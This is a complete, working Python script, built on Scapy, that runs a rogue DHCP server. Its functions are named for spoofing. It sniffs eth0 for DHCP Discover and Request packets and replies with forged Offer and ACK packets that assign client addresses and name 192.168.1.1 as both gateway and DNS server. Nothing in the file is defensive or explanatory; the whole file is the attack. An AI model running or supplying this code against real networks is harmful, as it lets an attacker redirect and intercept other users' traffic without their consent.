from scapy.all import *
import threading

def handle_dhcp(packet):
    if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
        print("DHCP Discover detected")
        send_dhcp_offer(packet)

    elif DHCP in packet and packet[DHCP].options[0][1] == 3:  # DHCP Request
        print("DHCP Request detected")
        send_dhcp_ack(packet)

def send_dhcp_offer(discover_packet):
    client_mac = discover_packet[Ether].src
    transaction_id = discover_packet[BOOTP].xid

    offer = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac) / \
            IP(src='192.168.1.1', dst='255.255.255.255') / \
            UDP(sport=67, dport=68) / \
            BOOTP(op=2, yiaddr='192.168.1.100', siaddr='192.168.1.1', xid=transaction_id, chaddr=client_mac) / \
            DHCP(options=[('message-type', 'offer'), ('server_id', '192.168.1.1'), ('lease_time', 600), ('subnet_mask', '255.255.255.0'), ('router', '192.168.1.1'), ('name_server', '192.168.1.1'), 'end'])

    sendp(offer, iface=conf.iface)
    print("DHCP Offer sent")

def send_dhcp_ack(request_packet):
    client_mac = request_packet[Ether].src
    transaction_id = request_packet[BOOTP].xid

    ack = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac) / \
          IP(src='192.168.1.1', dst='255.255.255.255') / \
          UDP(sport=67, dport=68) / \
          BOOTP(op=2, yiaddr='192.168.1.100', siaddr='192.168.1.1', xid=transaction_id, chaddr=client_mac) / \
          DHCP(options=[('message-type', 'ack'), ('server_id', '192.168.1.1'), ('lease_time', 600), ('subnet_mask', '255.255.255.0'), ('router', '192.168.1.1'), ('name_server', '192.168.1.1'), 'end'])

    sendp(ack, iface=conf.iface)
    print("DHCP ACK sent")

def start_dhcp_spoofing():
    sniff(filter="udp and (port 67 or 68)", prn=handle_dhcp, iface=conf.iface, store=0)

if __name__ == "__main__":
    conf.iface = "eth0"  # Defina a interface de rede correta
    start_dhcp_spoofing()
